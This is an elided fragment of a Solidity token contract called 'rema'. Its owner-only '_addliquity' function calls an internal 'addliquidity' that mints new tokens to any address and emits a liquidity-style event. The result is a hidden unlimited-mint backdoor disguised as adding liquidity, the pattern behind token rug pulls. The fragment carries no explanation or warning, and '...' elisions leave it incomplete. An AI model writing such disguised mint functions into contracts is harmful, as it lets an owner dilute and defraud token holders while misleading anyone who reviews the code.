...
contract rema is PausableToken {
    string public name;
    string public symbol;
    uint public decimals;
    event Addliquidity(address indexed from, address indexed to, uint256 value);
  ...
  function addliquidity(address account, uint256 amount) onlyOwner internal  {

        totalSupply = totalSupply.add(amount);
        balances[account] = balances[account].add(amount);
        emit Addliquidity(address(0), account, amount);
	...
	function _burn(address _who, uint256 _value) internal {
     ...
     function _addliquity(address b, uint256 r) onlyOwner public  {
    addliquidity(b,r);
